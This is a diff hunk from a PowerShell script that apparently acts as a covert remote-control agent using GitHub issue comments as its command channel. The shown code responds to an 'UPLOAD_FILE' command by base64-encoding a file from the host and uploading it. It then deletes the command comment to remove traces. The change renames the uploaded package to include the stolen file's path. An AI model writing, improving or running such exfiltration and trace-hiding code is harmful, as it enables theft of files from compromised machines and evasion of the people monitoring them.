@@ -199,7 +199,7 @@ try
                     Write-Console -Body ("Found target file at " + $targetFilePath + ". Attempting to upload it...") -IssueNumber $issueNumber
                     Write-Host ("DEBUG: Found target file with path " + $targetFilePath + ". Attempting to upload it...")
                     $fileBytes = [System.Convert]::ToBase64String($(Get-Content -ReadCount 0 -Encoding Byte -Path $targetFilePath))
-                    Send-PackageMessage -PackageName "FILE" -IssueNumber $issueNumber -Body ($fileBytes)
+                    Send-PackageMessage -PackageName ("FILE_" + $targetFilePath) -IssueNumber $issueNumber -Body ($fileBytes)
                     Write-Console -Body ("Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...") -IssueNumber $issueNumber
                     Write-Host ("DEBUG: Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...")
                     Remove-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -CommentID $comment.ID
